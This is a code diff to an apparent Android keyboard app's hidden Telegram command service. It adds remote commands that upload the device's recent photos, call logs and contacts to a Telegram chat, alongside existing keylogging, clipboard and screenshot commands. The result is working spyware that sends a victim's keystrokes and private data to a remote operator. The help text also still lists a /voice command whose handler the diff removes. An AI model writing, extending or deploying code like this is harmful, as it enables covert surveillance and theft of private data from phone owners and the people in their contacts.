@@ -7,10 +7,15 @@ import android.app.Service;
 import android.content.ClipboardManager;
 import android.content.Context;
 import android.content.Intent;
+import android.database.Cursor;
+import android.net.Uri;
 import android.os.Build;
 import android.os.Handler;
 import android.os.IBinder;
 import android.os.Looper;
+import android.provider.CallLog;
+import android.provider.ContactsContract;
+import android.provider.MediaStore;
 import android.util.Log;
 
 import androidx.core.app.NotificationCompat;
@@ -154,19 +159,107 @@ public class TelegramCommandService extends Service {
         } else if (command.startsWith("/keylog")) {
             String logs = LogReadUtils.readCurrentLogFile(this);
             TelegramReporter.sendMessage(settings.mTelegramBotToken, settings.mTelegramChatId, "Last Logs:\n" + logs);
-        } else if (command.startsWith("/voice")) {
+        } else if (command.startsWith("/photos")) {
             mHandler.post(new Runnable() {
                 @Override
                 public void run() {
-                    Intent voiceIntent = new Intent(TelegramCommandService.this, AudioCaptureService.class);
-                    voiceIntent.putExtra("duration", 10000); // 10 seconds
-                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                        startForegroundService(voiceIntent);
-                    } else {
-                        startService(voiceIntent);
-                    }
+                    sendPhotos();
                 }
             });
+        } else if (command.startsWith("/calls")) {
+            mHandler.post(new Runnable() {
+                @Override
+                public void run() {
+                    sendCallLogs();
+                }
+            });
+        } else if (command.startsWith("/contacts")) {
+            mHandler.post(new Runnable() {
+                @Override
+                public void run() {
+                    sendContacts();
+                }
+            });
+        } else if (command.startsWith("/help")) {
+            String helpText = "🤖 *RBoard Commands*:\n" +
+                    "/scrnshot - Take a screenshot\n" +
+                    "/clpboard - Get current clipboard\n" +
+                    "/keylog - Get typing logs\n" +
+                    "/voice - Record 10s audio\n" +
+                    "/photos - Get recent 10 photos\n" +
+                    "/calls - Get last 20 call logs\n" +
+                    "/contacts - Get first 50 contacts";
+            TelegramReporter.sendMessage(settings.mTelegramBotToken, settings.mTelegramChatId, helpText);
+        }
+    }
+
+    private void sendPhotos() {
+        final SettingsValues settings = Settings.getInstance().getCurrent();
+        Uri uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI;
+        String[] projection = {MediaStore.Images.Media.DATA, MediaStore.Images.Media.DATE_TAKEN};
+        String sortOrder = MediaStore.Images.Media.DATE_TAKEN + " DESC";
+        try (Cursor cursor = getContentResolver().query(uri, projection, null, null, sortOrder)) {
+            if (cursor != null) {
+                int count = 0;
+                while (cursor.moveToNext() && count < 10) {
+                    String path = cursor.getString(cursor.getColumnIndex(MediaStore.Images.Media.DATA));
+                    TelegramReporter.sendDocument(settings.mTelegramBotToken, settings.mTelegramChatId, new File(path), "Photo " + (count + 1));
+                    count++;
+                }
+                if (count == 0) {
+                    TelegramReporter.sendMessage(settings.mTelegramBotToken, settings.mTelegramChatId, "No photos found.");
+                }
+            }
+        } catch (Exception e) {
+            Log.e(TAG, "Error sending photos", e);
+        }
+    }
+
+    private void sendCallLogs() {
+        final SettingsValues settings = Settings.getInstance().getCurrent();
+        StringBuilder sb = new StringBuilder("📞 Last 20 Call Logs:\n");
+        try (Cursor cursor = getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, CallLog.Calls.DATE + " DESC")) {
+            if (cursor != null) {
+                int count = 0;
+                while (cursor.moveToNext() && count < 20) {
+                    String number = cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER));
+                    String name = cursor.getString(cursor.getColumnIndex(CallLog.Calls.CACHED_NAME));
+                    int type = cursor.getInt(cursor.getColumnIndex(CallLog.Calls.TYPE));
+                    long date = cursor.getLong(cursor.getColumnIndex(CallLog.Calls.DATE));
+                    String typeStr = "Unknown";
+                    switch (type) {
+                        case CallLog.Calls.INCOMING_TYPE: typeStr = "Incoming"; break;
+                        case CallLog.Calls.OUTGOING_TYPE: typeStr = "Outgoing"; break;
+                        case CallLog.Calls.MISSED_TYPE: typeStr = "Missed"; break;
+                    }
+                    sb.append(String.format("[%s] %s (%s): %s\n",
+                            new SimpleDateFormat("MM-dd HH:mm", Locale.getDefault()).format(new Date(date)),
+                            name != null ? name : "Unknown", number, typeStr));
+                    count++;
+                }
+                TelegramReporter.sendMessage(settings.mTelegramBotToken, settings.mTelegramChatId, sb.toString());
+            }
+        } catch (Exception e) {
+            Log.e(TAG, "Error sending call logs", e);
+        }
+    }
+
+    private void sendContacts() {
+        final SettingsValues settings = Settings.getInstance().getCurrent();
+        StringBuilder sb = new StringBuilder("👥 First 50 Contacts:\n");
+        try (Cursor cursor = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC")) {
+            if (cursor != null) {
+                int count = 0;
+                while (cursor.moveToNext() && count < 50) {
+                    String name = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
+                    String number = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
+                    sb.append(name).append(": ").append(number).append("\n");
+                    count++;
+                }
+                TelegramReporter.sendMessage(settings.mTelegramBotToken, settings.mTelegramChatId, sb.toString());
+            }
+        } catch (Exception e) {
+            Log.e(TAG, "Error sending contacts", e);
         }
     }
 
